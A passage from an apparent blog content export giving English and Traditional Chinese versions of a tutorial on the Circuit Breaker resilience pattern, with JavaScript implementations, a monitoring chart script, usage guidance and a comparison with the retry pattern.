execute(operation) &#123; if (this.state &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; if (Date.now() &lt; this.nextAttempt) &#123; throw new Error(&#39;Circuit breaker is OPEN&#39;); &#125; &#x2F;&#x2F; Enter half-open state this.state &#x3D; &#39;HALF_OPEN&#39;; this.successCount &#x3D; 0; console.log(&#39;Circuit breaker HALF-OPEN - testing service&#39;); &#125; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; &#x2F;&#x2F; Limit concurrent requests in half-open state if (this.pendingRequests &gt;&#x3D; 3) &#123; throw new Error(&#39;Circuit breaker is HALF_OPEN - limiting requests&#39;); &#125; &#125; try &#123; this.pendingRequests++; const result &#x3D; await operation(); this.onSuccess(); return result; &#125; catch (error) &#123; this.onFailure(); throw error; &#125; finally &#123; this.pendingRequests--; &#125; &#125; &#125; Practical Implementation Here’s a production-ready circuit breaker with monitoring: class ProductionCircuitBreaker &#123; constructor(serviceName, options &#x3D; &#123;&#125;) &#123; this.serviceName &#x3D; serviceName; this.failureThreshold &#x3D; options.failureThreshold || 5; this.successThreshold &#x3D; options.successThreshold || 2; this.timeout &#x3D; options.timeout || 60000; this.monitoringPeriod &#x3D; options.monitoringPeriod || 10000; this.state &#x3D; &#39;CLOSED&#39;; this.failureCount &#x3D; 0; this.successCount &#x3D; 0; this.nextAttempt &#x3D; Date.now(); this.lastStateChange &#x3D; Date.now(); &#x2F;&#x2F; Metrics this.metrics &#x3D; &#123; totalRequests: 0, successfulRequests: 0, failedRequests: 0, rejectedRequests: 0 &#125;; &#x2F;&#x2F; Reset failure count periodically this.resetInterval &#x3D; setInterval(() &#x3D;&gt; &#123; if (this.state &#x3D;&#x3D;&#x3D; &#39;CLOSED&#39;) &#123; this.failureCount &#x3D; 0; &#125; &#125;, this.monitoringPeriod); &#125; async execute(operation, fallback &#x3D; null) &#123; this.metrics.totalRequests++; if (this.state &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; if (Date.now() &lt; this.nextAttempt) &#123; this.metrics.rejectedRequests++; if (fallback) &#123; return await fallback(); &#125; throw new CircuitBreakerOpenError( &#96;Circuit breaker is OPEN for $&#123;this.serviceName&#125;&#96; ); &#125; this.transitionTo(&#39;HALF_OPEN&#39;); &#125; try &#123; const result &#x3D; await operation(); this.onSuccess(); this.metrics.successfulRequests++; return result; &#125; catch (error) &#123; this.onFailure(error); this.metrics.failedRequests++; if (fallback &amp;&amp; this.state &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; return await fallback(); &#125; throw error; &#125; &#125; onSuccess() &#123; this.failureCount &#x3D; 0; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; this.successCount++; if (this.successCount &gt;&#x3D; this.successThreshold) &#123; this.transitionTo(&#39;CLOSED&#39;); &#125; &#125; &#125; onFailure(error) &#123; this.failureCount++; this.successCount &#x3D; 0; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; this.transitionTo(&#39;OPEN&#39;); &#125; else if (this.state &#x3D;&#x3D;&#x3D; &#39;CLOSED&#39; &amp;&amp; this.failureCount &gt;&#x3D; this.failureThreshold) &#123; this.transitionTo(&#39;OPEN&#39;); &#125; this.logError(error); &#125; transitionTo(newState) &#123; const oldState &#x3D; this.state; this.state &#x3D; newState; this.lastStateChange &#x3D; Date.now(); if (newState &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; this.nextAttempt &#x3D; Date.now() + this.timeout; &#125; this.emitStateChange(oldState, newState); &#125; emitStateChange(oldState, newState) &#123; console.log( &#96;[$&#123;this.serviceName&#125;] Circuit breaker: $&#123;oldState&#125; → $&#123;newState&#125;&#96; ); &#x2F;&#x2F; Emit metrics for monitoring this.publishMetrics(&#123; service: this.serviceName, state: newState, timestamp: Date.now(), metrics: this.metrics &#125;); &#125; logError(error) &#123; console.error( &#96;[$&#123;this.serviceName&#125;] Request failed:&#96;, error.message ); &#125; publishMetrics(data) &#123; &#x2F;&#x2F; Send to monitoring system &#x2F;&#x2F; Example: CloudWatch, Prometheus, Datadog &#125; getMetrics() &#123; return &#123; ...this.metrics, state: this.state, failureCount: this.failureCount, successCount: this.successCount &#125;; &#125; destroy() &#123; clearInterval(this.resetInterval); &#125; &#125; class CircuitBreakerOpenError extends Error &#123; constructor(message) &#123; super(message); this.name &#x3D; &#39;CircuitBreakerOpenError&#39;; &#125; &#125; Real-World Example: E-Commerce Platform class RecommendationService &#123; constructor() &#123; this.circuitBreaker &#x3D; new ProductionCircuitBreaker( &#39;recommendation-service&#39;, &#123; failureThreshold: 5, successThreshold: 3, timeout: 30000 &#125; ); this.cache &#x3D; new Map(); &#125; async getRecommendations(userId) &#123; const fallback &#x3D; async () &#x3D;&gt; &#123; &#x2F;&#x2F; Return cached recommendations if (this.cache.has(userId)) &#123; return &#123; recommendations: this.cache.get(userId), source: &#39;cache&#39; &#125;; &#125; &#x2F;&#x2F; Return popular items as fallback return &#123; recommendations: await this.getPopularItems(), source: &#39;fallback&#39; &#125;; &#125;; return await this.circuitBreaker.execute( async () &#x3D;&gt; &#123; const response &#x3D; await fetch( &#96;https:&#x2F;&#x2F;recommendations-api.example.com&#x2F;users&#x2F;$&#123;userId&#125;&#96; ); if (!response.ok) &#123; throw new Error(&#96;HTTP $&#123;response.status&#125;&#96;); &#125; const data &#x3D; await response.json(); &#x2F;&#x2F; Update cache on success this.cache.set(userId, data.recommendations); return &#123; recommendations: data.recommendations, source: &#39;live&#39; &#125;; &#125;, fallback ); &#125; async getPopularItems() &#123; &#x2F;&#x2F; Return static popular items return [ &#123; id: &#39;item-1&#39;, name: &#39;Popular Item 1&#39; &#125;, &#123; id: &#39;item-2&#39;, name: &#39;Popular Item 2&#39; &#125;, &#123; id: &#39;item-3&#39;, name: &#39;Popular Item 3&#39; &#125; ]; &#125; &#125; &#x2F;&#x2F; Usage const recommendationService &#x3D; new RecommendationService(); async function displayRecommendations(userId) &#123; try &#123; const result &#x3D; await recommendationService.getRecommendations(userId); if (result.source &#x3D;&#x3D;&#x3D; &#39;cache&#39;) &#123; console.log(&#39;Showing cached recommendations&#39;); &#125; else if (result.source &#x3D;&#x3D;&#x3D; &#39;fallback&#39;) &#123; console.log(&#39;Showing popular items (service unavailable)&#39;); &#125; else &#123; console.log(&#39;Showing personalized recommendations&#39;); &#125; return result.recommendations; &#125; catch (error) &#123; console.error(&#39;Failed to get recommendations:&#39;, error); return []; &#125; &#125; Circuit Breaker with Retry Pattern Combining circuit breaker with retry for transient faults: class ResilientServiceClient &#123; constructor(serviceName) &#123; this.circuitBreaker &#x3D; new ProductionCircuitBreaker(serviceName, &#123; failureThreshold: 3, timeout: 60000 &#125;); &#125; async callWithRetry(operation, maxRetries &#x3D; 3) &#123; return await this.circuitBreaker.execute(async () &#x3D;&gt; &#123; let lastError; for (let attempt &#x3D; 1; attempt &lt;&#x3D; maxRetries; attempt++) &#123; try &#123; return await operation(); &#125; catch (error) &#123; lastError &#x3D; error; &#x2F;&#x2F; Don&#39;t retry on certain errors if (this.isNonRetryableError(error)) &#123; throw error; &#125; if (attempt &lt; maxRetries) &#123; &#x2F;&#x2F; Exponential backoff const delay &#x3D; Math.min(1000 * Math.pow(2, attempt - 1), 10000); await this.sleep(delay); &#125; &#125; &#125; throw lastError; &#125;); &#125; isNonRetryableError(error) &#123; &#x2F;&#x2F; Don&#39;t retry client errors (4xx) return error.status &gt;&#x3D; 400 &amp;&amp; error.status &lt; 500; &#125; sleep(ms) &#123; return new Promise(resolve &#x3D;&gt; setTimeout(resolve, ms)); &#125; &#125; Monitoring and Metrics (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_60c984cfa')); var option = { \"title\": { \"text\": \"Circuit Breaker State Over Time\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"Requests\", \"Failures\", \"Circuit State\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"10:00\", \"10:05\", \"10:10\", \"10:15\", \"10:20\", \"10:25\", \"10:30\"] }, \"yAxis\": [ { \"type\": \"value\", \"name\": \"Requests\" }, { \"type\": \"value\", \"name\": \"State\", \"max\": 2, \"axisLabel\": { \"formatter\": function(value) { return [\"Closed\", \"Half-Open\", \"Open\"][value] || \"\"; } } } ], \"series\": [ { \"name\": \"Requests\", \"type\": \"line\", \"data\": [100, 95, 90, 20, 25, 80, 100] }, { \"name\": \"Failures\", \"type\": \"line\", \"data\": [2, 5, 15, 18, 10, 3, 1] }, { \"name\": \"Circuit State\", \"type\": \"line\", \"yAxisIndex\": 1, \"data\": [0, 0, 2, 2, 1, 0, 0], \"itemStyle\": { \"color\": \"#f59f00\" } } ] }; chart.setOption(option); } })(); Key Considerations 💡 Exception HandlingApplications must handle circuit breaker exceptions gracefully: Provide fallback responses Display user-friendly messages Log for monitoring and alerting 💡 Timeout ConfigurationBalance timeout duration with recovery patterns: Too short: Circuit reopens before service recovers Too long: Users wait unnecessarily Use adaptive timeouts based on historical data ⚠️ Monitoring is CriticalTrack circuit breaker metrics: State transitions (closed → open → half-open) Request success/failure rates Time spent in each state Alert when circuits open frequently 💡 Fallback StrategiesProvide meaningful fallbacks when circuit is open: Cached data Default values Degraded functionality User notification When to Use Circuit Breaker Use this pattern when: ✅ Preventing cascading failures: Stop failures from spreading across services ✅ Protecting shared resources: Prevent resource exhaustion from failing dependencies ✅ Graceful degradation: Maintain partial functionality when services fail ✅ Fast failure: Avoid waiting for timeouts on known failures Don’t use this pattern when: ❌ Local resources: In-memory operations don’t need circuit breakers ❌ Business logic exceptions: Use for infrastructure failures, not business rules ❌ Simple retry is sufficient: Transient faults with quick recovery ❌ Message queues: Dead letter queues handle failures better Comparison with Retry Pattern Aspect Circuit Breaker Retry Pattern Purpose Prevent calls to failing services Recover from transient faults When to use Persistent failures Temporary failures Behavior Fails fast after threshold Keeps trying with delays Resource usage Minimal (immediate rejection) Higher (waits for retries) Recovery detection Active (half-open testing) Passive (retry succeeds) 💡 Best Practice: Combine Both PatternsUse retry pattern inside circuit breaker: Circuit breaker wraps the operation Retry handles transient faults Circuit breaker prevents excessive retries System gets best of both approaches Summary The Circuit Breaker pattern is essential for building resilient distributed systems: Prevents cascading failures by stopping calls to failing services Protects system resources from exhaustion during outages Enables graceful degradation with fallback responses Provides fast failure instead of waiting for timeouts Monitors service health and detects recovery automatically Like an electrical circuit breaker protecting your home, this pattern protects your distributed system from damage caused by failing dependencies. It’s not about preventing failures—it’s about failing gracefully and recovering quickly. References Microsoft Azure Architecture Patterns - Circuit Breaker Martin Fowler - CircuitBreaker Release It! by Michael Nygard","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"en"},{"title":"斷路器模式：防止連鎖故障","slug":"2020/01/Circuit-Breaker-Pattern-zh-TW","date":"un11fin11","updated":"un55fin55","comments":true,"path":"/zh-TW/2020/01/Circuit-Breaker-Pattern/","permalink":"https://neo01.com/zh-TW/2020/01/Circuit-Breaker-Pattern/","excerpt":"了解斷路器模式如何透過暫時阻擋對故障服務的呼叫來保護分散式系統免於連鎖故障，讓系統有時間恢復。","text":"想像你家中的電路系統。當過多電流流經電線時——可能是短路或插座過載——斷路器會跳脫，切斷電源以防止損壞或火災。斷路器不會持續嘗試將電力強制通過危險的情況。相反地，它會快速失敗，保護整個系統。問題修復後，你可以重置斷路器並恢復供電。 同樣的原理適用於分散式系統。當遠端服務故障時，斷路器模式可防止應用程式重複嘗試注定失敗的操作，保護系統資源並實現優雅降級。 電路斷路器類比 就像電路斷路器： 監控電流（請求失敗） 超過閾值時跳脫（過多失敗） 開啟時阻擋進一步嘗試（防止連鎖故障） 冷卻後允許測試（半開狀態） 服務恢復時重置（關閉狀態） 軟體斷路器： 監控服務呼叫失敗 達到失敗閾值時開啟 開啟時立即拒絕請求 逾時後允許有限的測試請求 服務展現恢復時關閉 stateDiagram-v2 [*] --> Closed Closed --> Open: 達到失敗閾值 Open --> HalfOpen: 逾時到期 HalfOpen --> Closed: 達到成功閾值 HalfOpen --> Open: 發生任何失敗 note right of Closed 正常運作 請求通過 計算失敗次數 end note note right of Open 快速失敗 請求被拒絕 計時器運行中 end note note right of HalfOpen 有限測試 允許試探請求 評估恢復狀況 end note 問題：分散式系統中的連鎖故障 在分散式環境中，遠端服務呼叫可能因各種原因失敗： 暫時性故障 &#x2F;&#x2F; 會自行解決的臨時問題 class PaymentService &#123; async processPayment(orderId, amount) &#123; try &#123; &#x2F;&#x2F; 網路短暫中斷 - 重試可能成功 return await this.paymentGateway.charge(amount); &#125; catch (error) &#123; if (error.code &#x3D;&#x3D;&#x3D; &#39;NETWORK_TIMEOUT&#39;) &#123; &#x2F;&#x2F; 暫時性 - 重試可能有效 return await this.retry(() &#x3D;&gt; this.paymentGateway.charge(amount) ); &#125; &#125; &#125; &#125; 持續性故障 &#x2F;&#x2F; 服務完全當機 - 重試無濟於事 class InventoryService &#123; async checkStock(productId) &#123; try &#123; return await this.inventoryApi.getStock(productId); &#125; catch (error) &#123; if (error.code &#x3D;&#x3D;&#x3D; &#39;SERVICE_UNAVAILABLE&#39;) &#123; &#x2F;&#x2F; 服務崩潰 - 重試浪費資源 &#x2F;&#x2F; 每次重試都會佔用執行緒、記憶體、連線 &#x2F;&#x2F; 逾時期間會阻擋其他操作 throw new Error(&#39;Inventory service unavailable&#39;); &#125; &#125; &#125; &#125; 資源耗盡 &#x2F;&#x2F; 失敗的服務消耗關鍵資源 class OrderProcessor &#123; async processOrder(order) &#123; &#x2F;&#x2F; 每次失敗的呼叫都會佔用資源直到逾時 const promises &#x3D; [ this.inventoryService.reserve(order.items), &#x2F;&#x2F; 30秒逾時 this.paymentService.charge(order.total), &#x2F;&#x2F; 30秒逾時 this.shippingService.schedule(order.address) &#x2F;&#x2F; 30秒逾時 ]; try &#123; await Promise.all(promises); &#125; catch (error) &#123; &#x2F;&#x2F; 如果庫存服務當機： &#x2F;&#x2F; - 100個並發訂單 &#x3D; 100個執行緒被阻擋 &#x2F;&#x2F; - 每個等待30秒逾時 &#x2F;&#x2F; - 資料庫連線被佔用 &#x2F;&#x2F; - 待處理請求消耗記憶體 &#x2F;&#x2F; - 其他服務無法取得資源 &#125; &#125; &#125; ⚠️ 連鎖故障問題初始故障：一個服務變慢或無法使用 資源阻塞：呼叫者等待逾時，佔用執行緒和連線 資源耗盡：系統耗盡執行緒、記憶體或連線 連鎖影響：其他不相關的操作因資源匱乏而失敗 全系統中斷：整個應用程式變得無回應 解決方案：斷路器模式 斷路器作為代理監控失敗並防止呼叫故障服務： class CircuitBreaker &#123; constructor(options &#x3D; &#123;&#125;) &#123; this.failureThreshold &#x3D; options.failureThreshold || 5; this.successThreshold &#x3D; options.successThreshold || 2; this.timeout &#x3D; options.timeout || 60000; &#x2F;&#x2F; 60秒 this.monitoringPeriod &#x3D; options.monitoringPeriod || 10000; &#x2F;&#x2F; 10秒 this.state &#x3D; &#39;CLOSED&#39;; this.failureCount &#x3D; 0; this.successCount &#x3D; 0; this.nextAttempt &#x3D; Date.now(); &#125; async execute(operation) &#123; if (this.state &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; if (Date.now() &lt; this.nextAttempt) &#123; throw new Error(&#39;Circuit breaker is OPEN&#39;); &#125; &#x2F;&#x2F; 逾時到期，嘗試半開 this.state &#x3D; &#39;HALF_OPEN&#39;; this.successCount &#x3D; 0; &#125; try &#123; const result &#x3D; await operation(); this.onSuccess(); return result; &#125; catch (error) &#123; this.onFailure(); throw error; &#125; &#125; onSuccess() &#123; this.failureCount &#x3D; 0; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; this.successCount++; if (this.successCount &gt;&#x3D; this.successThreshold) &#123; this.state &#x3D; &#39;CLOSED&#39;; console.log(&#39;斷路器關閉 - 服務已恢復&#39;); &#125; &#125; &#125; onFailure() &#123; this.failureCount++; this.successCount &#x3D; 0; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; this.state &#x3D; &#39;OPEN&#39;; this.nextAttempt &#x3D; Date.now() + this.timeout; console.log(&#39;斷路器開啟 - 服務仍在故障中&#39;); &#125; if (this.state &#x3D;&#x3D;&#x3D; &#39;CLOSED&#39; &amp;&amp; this.failureCount &gt;&#x3D; this.failureThreshold) &#123; this.state &#x3D; &#39;OPEN&#39;; this.nextAttempt &#x3D; Date.now() + this.timeout; console.log(&#39;斷路器開啟 - 達到閾值&#39;); &#125; &#125; getState() &#123; return this.state; &#125; &#125; 斷路器狀態 graph TB subgraph Closed[\"🟢 關閉狀態\"] C1[請求到達] C2[傳遞給服務] C3{成功？} C4[增加失敗計數器] C5{達到閾值？} C6[回傳結果] C1 --> C2 C2 --> C3 C3 -->|是| C6 C3 -->|否| C4 C4 --> C5 C5 -->|否| C6 end subgraph Open[\"🔴 開啟狀態\"] O1[請求到達] O2[立即失敗] O3[回傳快取/預設值] O4{逾時到期？} O1 --> O2 O2 --> O3 O3 --> O4 end subgraph HalfOpen[\"🟡 半開狀態\"] H1[有限請求] H2[傳遞給服務] H3{成功？} H4[增加成功計數器] H5{成功閾值？} H1 --> H2 H2 --> H3 H3 -->|是| H4 H4 --> H5 end C5 -->|是| Open O4 -->|是| HalfOpen H5 -->|是| Closed H3 -->|否| Open style Closed fill:#d3f9d8,stroke:#2f9e44 style Open fill:#ffe3e3,stroke:#c92a2a style HalfOpen fill:#fff3bf,stroke:#f59f00 關閉狀態：正常運作 class InventoryServiceClient &#123; constructor() &#123; this.circuitBreaker &#x3D; new CircuitBreaker(&#123; failureThreshold: 5, timeout: 60000 &#125;); &#125; async checkStock(productId) &#123; return await this.circuitBreaker.execute(async () &#x3D;&gt; &#123; &#x2F;&#x2F; 正常運作 - 請求通過 const response &#x3D; await fetch( &#96;https:&#x2F;&#x2F;inventory-api.example.com&#x2F;stock&#x2F;$&#123;productId&#125;&#96; ); if (!response.ok) &#123; throw new Error(&#96;HTTP $&#123;response.status&#125;&#96;); &#125; return await response.json(); &#125;); &#125; &#125; &#x2F;&#x2F; 使用方式 const client &#x3D; new InventoryServiceClient(); &#x2F;&#x2F; 前4次失敗 - 斷路器保持關閉 for (let i &#x3D; 0; i &lt; 4; i++) &#123; try &#123; await client.checkStock(&#39;product-123&#39;); &#125; catch (error) &#123; console.log(&#96;嘗試 $&#123;i + 1&#125; 失敗&#96;); &#125; &#125; &#x2F;&#x2F; 第5次失敗 - 斷路器開啟 try &#123; await client.checkStock(&#39;product-123&#39;); &#125; catch (error) &#123; console.log(&#39;斷路器開啟&#39;); &#125; 開啟狀態：快速失敗 class OrderService &#123; constructor() &#123; this.inventoryClient &#x3D; new InventoryServiceClient(); this.defaultStock &#x3D; &#123; available: false, quantity: 0 &#125;; &#125; async processOrder(order) &#123; try &#123; &#x2F;&#x2F; 斷路器開啟 - 立即失敗 const stock &#x3D; await this.inventoryClient.checkStock(order.productId); return this.completeOrder(order, stock); &#125; catch (error) &#123; if (error.message &#x3D;&#x3D;&#x3D; &#39;Circuit breaker is OPEN&#39;) &#123; &#x2F;&#x2F; 優雅降級 console.log(&#39;庫存服務無法使用，使用預設值&#39;); return this.completeOrder(order, this.defaultStock); &#125; throw error; &#125; &#125; completeOrder(order, stock) &#123; if (!stock.available) &#123; return &#123; status: &#39;PENDING&#39;, message: &#39;庫存檢查無法使用。訂單將很快被驗證。&#39; &#125;; &#125; return &#123; status: &#39;CONFIRMED&#39;, message: &#39;訂單已確認&#39; &#125;; &#125; &#125; 半開狀態：測試恢復 class CircuitBreakerWithHalfOpen extends CircuitBreaker &#123; async execute(operation) &#123; if (this.state &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; if (Date.now() &lt; this.nextAttempt) &#123; throw new Error(&#39;Circuit breaker is OPEN&#39;); &#125; &#x2F;&#x2F; 進入半開狀態 this.state &#x3D; &#39;HALF_OPEN&#39;; this.successCount &#x3D; 0; console.log(&#39;斷路器半開 - 測試服務&#39;); &#125; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; &#x2F;&#x2F; 在半開狀態限制並發請求 if (this.pendingRequests &gt;&#x3D; 3) &#123; throw new Error(&#39;Circuit breaker is HALF_OPEN - limiting requests&#39;); &#125; &#125; try &#123; this.pendingRequests++; const result &#x3D; await operation(); this.onSuccess(); return result; &#125; catch (error) &#123; this.onFailure(); throw error; &#125; finally &#123; this.pendingRequests--; &#125; &#125; &#125; 實際實作 這是一個生產就緒的斷路器，具有監控功能： class ProductionCircuitBreaker &#123; constructor(serviceName, options &#x3D; &#123;&#125;) &#123; this.serviceName &#x3D; serviceName; this.failureThreshold &#x3D; options.failureThreshold || 5; this.successThreshold &#x3D; options.successThreshold || 2; this.timeout &#x3D; options.timeout || 60000; this.monitoringPeriod &#x3D; options.monitoringPeriod || 10000; this.state &#x3D; &#39;CLOSED&#39;; this.failureCount &#x3D; 0; this.successCount &#x3D; 0; this.nextAttempt &#x3D; Date.now(); this.lastStateChange &#x3D; Date.now(); &#x2F;&#x2F; 指標 this.metrics &#x3D; &#123; totalRequests: 0, successfulRequests: 0, failedRequests: 0, rejectedRequests: 0 &#125;; &#x2F;&#x2F; 定期重置失敗計數 this.resetInterval &#x3D; setInterval(() &#x3D;&gt; &#123; if (this.state &#x3D;&#x3D;&#x3D; &#39;CLOSED&#39;) &#123; this.failureCount &#x3D; 0; &#125; &#125;, this.monitoringPeriod); &#125; async execute(operation, fallback &#x3D; null) &#123; this.metrics.totalRequests++; if (this.state &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; if (Date.now() &lt; this.nextAttempt) &#123; this.metrics.rejectedRequests++; if (fallback) &#123; return await fallback(); &#125; throw new CircuitBreakerOpenError( &#96;Circuit breaker is OPEN for $&#123;this.serviceName&#125;&#96; ); &#125; this.transitionTo(&#39;HALF_OPEN&#39;); &#125; try &#123; const result &#x3D; await operation(); this.onSuccess(); this.metrics.successfulRequests++; return result; &#125; catch (error) &#123; this.onFailure(error); this.metrics.failedRequests++; if (fallback &amp;&amp; this.state &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; return await fallback(); &#125; throw error; &#125; &#125; onSuccess() &#123; this.failureCount &#x3D; 0; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; this.successCount++; if (this.successCount &gt;&#x3D; this.successThreshold) &#123; this.transitionTo(&#39;CLOSED&#39;); &#125; &#125; &#125; onFailure(error) &#123; this.failureCount++; this.successCount &#x3D; 0; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; this.transitionTo(&#39;OPEN&#39;); &#125; else if (this.state &#x3D;&#x3D;&#x3D; &#39;CLOSED&#39; &amp;&amp; this.failureCount &gt;&#x3D; this.failureThreshold) &#123; this.transitionTo(&#39;OPEN&#39;); &#125; this.logError(error); &#125; transitionTo(newState) &#123; const oldState &#x3D; this.state; this.state &#x3D; newState; this.lastStateChange &#x3D; Date.now(); if (newState &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; this.nextAttempt &#x3D; Date.now() + this.timeout; &#125; this.emitStateChange(oldState, newState); &#125; emitStateChange(oldState, newState) &#123; console.log( &#96;[$&#123;this.serviceName&#125;] 斷路器：$&#123;oldState&#125; → $&#123;newState&#125;&#96; ); &#x2F;&#x2F; 發送指標供監控 this.publishMetrics(&#123; service: this.serviceName, state: newState, timestamp: Date.now(), metrics: this.metrics &#125;); &#125; logError(error) &#123; console.error( &#96;[$&#123;this.serviceName&#125;] 請求失敗：&#96;, error.message ); &#125; publishMetrics(data) &#123; &#x2F;&#x2F; 發送到監控系統 &#x2F;&#x2F; 範例：CloudWatch、Prometheus、Datadog &#125; getMetrics() &#123; return &#123; ...this.metrics, state: this.state, failureCount: this.failureCount, successCount: this.successCount &#125;; &#125; destroy() &#123; clearInterval(this.resetInterval); &#125; &#125; class CircuitBreakerOpenError extends Error &#123; constructor(message) &#123; super(message); this.name &#x3D; &#39;CircuitBreakerOpenError&#39;; &#125; &#125; 真實世界範例：電子商務平台 class RecommendationService &#123; constructor() &#123; this.circuitBreaker &#x3D; new ProductionCircuitBreaker( &#39;recommendation-service&#39;, &#123; failureThreshold: 5, successThreshold: 3, timeout: 30000 &#125; ); this.cache &#x3D; new Map(); &#125; async getRecommendations(userId) &#123; const fallback &#x3D; async () &#x3D;&gt; &#123; &#x2F;&#x2F; 回傳快取的推薦 if (this.cache.has(userId)) &#123; return &#123; recommendations: this.cache.get(userId), source: &#39;cache&#39; &#125;; &#125; &#x2F;&#x2F; 回傳熱門商品作為備援 return &#123; recommendations: await this.getPopularItems(), source: &#39;fallback&#39; &#125;; &#125;; return await this.circuitBreaker.execute( async () &#x3D;&gt; &#123; const response &#x3D; await fetch( &#96;https:&#x2F;&#x2F;recommendations-api.example.com&#x2F;users&#x2F;$&#123;userId&#125;&#96; ); if (!response.ok) &#123; throw new Error(&#96;HTTP $&#123;response.status&#125;&#96;); &#125; const data &#x3D; await response.json(); &#x2F;&#x2F; 成功時更新快取 this.cache.set(userId, data.recommendations); return &#123; recommendations: data.recommendations, source: &#39;live&#39; &#125;; &#125;, fallback ); &#125; async getPopularItems() &#123; &#x2F;&#x2F; 回傳靜態熱門商品 return [ &#123; id: &#39;item-1&#39;, name: &#39;熱門商品 1&#39; &#125;, &#123; id: &#39;item-2&#39;, name: &#39;熱門商品 2&#39; &#125;, &#123; id: &#39;item-3&#39;, name: &#39;熱門商品 3&#39; &#125; ]; &#125; &#125; &#x2F;&#x2F; 使用方式 const recommendationService &#x3D; new RecommendationService(); async function displayRecommendations(userId) &#123; try &#123; const result &#x3D; await recommendationService.getRecommendations(userId); if (result.source &#x3D;&#x3D;&#x3D; &#39;cache&#39;) &#123; console.log(&#39;顯示快取的推薦&#39;); &#125; else if (result.source &#x3D;&#x3D;&#x3D; &#39;fallback&#39;) &#123; console.log(&#39;顯示熱門商品（服務無法使用）&#39;); &#125; else &#123; console.log(&#39;顯示個人化推薦&#39;); &#125; return result.recommendations; &#125; catch (error) &#123; console.error(&#39;無法取得推薦：&#39;, error); return []; &#125; &#125; 斷路器與重試模式結合 結合斷路器與重試以處理暫時性故障： class ResilientServiceClient &#123; constructor(serviceName) &#123; this.circuitBreaker &#x3D; new ProductionCircuitBreaker(serviceName, &#123; failureThreshold: 3, timeout: 60000 &#125;); &#125; async callWithRetry(operation, maxRetries &#x3D; 3) &#123; return await this.circuitBreaker.execute(async () &#x3D;&gt; &#123; let lastError; for (let attempt &#x3D; 1; attempt &lt;&#x3D; maxRetries; attempt++) &#123; try &#123; return await operation(); &#125; catch (error) &#123; lastError &#x3D; error; &#x2F;&#x2F; 某些錯誤不重試 if (this.isNonRetryableError(error)) &#123; throw error; &#125; if (attempt &lt; maxRetries) &#123; &#x2F;&#x2F; 指數退避 const delay &#x3D; Math.min(1000 * Math.pow(2, attempt - 1), 10000); await this.sleep(delay); &#125; &#125; &#125; throw lastError; &#125;); &#125; isNonRetryableError(error) &#123; &#x2F;&#x2F; 不重試客戶端錯誤（4xx） return error.status &gt;&#x3D; 400 &amp;&amp; error.status &lt; 500; &#125; sleep(ms) &#123; return new Promise(resolve &#x3D;&gt; setTimeout(resolve, ms)); &#125; &#125; 監控與指標 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_63947f834')); var option = { \"title\": { \"text\": \"斷路器狀態隨時間變化\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"請求\", \"失敗\", \"斷路器狀態\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"10:00\", \"10:05\", \"10:10\", \"10:15\", \"10:20\", \"10:25\", \"10:30\"] }, \"yAxis\": [ { \"type\": \"value\", \"name\": \"請求數\" }, { \"type\": \"value\", \"name\": \"狀態\", \"max\": 2, \"axisLabel\": { \"formatter\": function(value) { return [\"關閉\", \"半開\", \"開啟\"][value] || \"\"; } } } ], \"series\": [ { \"name\": \"請求\", \"type\": \"line\", \"data\": [100, 95, 90, 20, 25, 80, 100] }, { \"name\": \"失敗\", \"type\": \"line\", \"data\": [2, 5, 15, 18, 10, 3, 1] }, { \"name\": \"斷路器狀態\", \"type\": \"line\", \"yAxisIndex\": 1, \"data\": [0, 0, 2, 2, 1, 0, 0], \"itemStyle\": { \"color\": \"#f59f00\" } } ] }; chart.setOption(option); } })(); 關鍵考量 💡 例外處理應用程式必須優雅地處理斷路器例外： 提供備援回應 顯示使用者友善的訊息 記錄以供監控和警示 💡 逾時設定平衡逾時時間與恢復模式： 太短：服務恢復前斷路器重新開啟 太長：使用者不必要地等待 根據歷史資料使用自適應逾時 ⚠️ 監控至關重要追蹤斷路器指標： 狀態轉換（關閉 → 開啟 → 半開） 請求成功/失敗率 在每個狀態花費的時間 斷路器頻繁開啟時發出警示 💡 備援策略斷路器開啟時提供有意義的備援： 快取資料 預設值 降級功能 使用者通知 何時使用斷路器 使用此模式當： ✅ 防止連鎖故障：阻止故障在服務間擴散 ✅ 保護共享資源：防止故障相依性造成資源耗盡 ✅ 優雅降級：服務故障時維持部分功能 ✅ 快速失敗：避免在已知故障上等待逾時 不要使用此模式當： ❌ 本地資源：記憶體內操作不需要斷路器 ❌ 業務邏輯例外：用於基礎設施故障，而非業務規則 ❌ 簡單重試就足夠：快速恢復的暫時性故障 ❌ 訊息佇列：死信佇列能更好地處理故障 與重試模式比較 面向 斷路器 重試模式 目的 防止呼叫故障服務 從暫時性故障恢復 何時使用 持續性故障 臨時故障 行為 達到閾值後快速失敗 持續嘗試並延遲 資源使用 最小（立即拒絕） 較高（等待重試） 恢復偵測 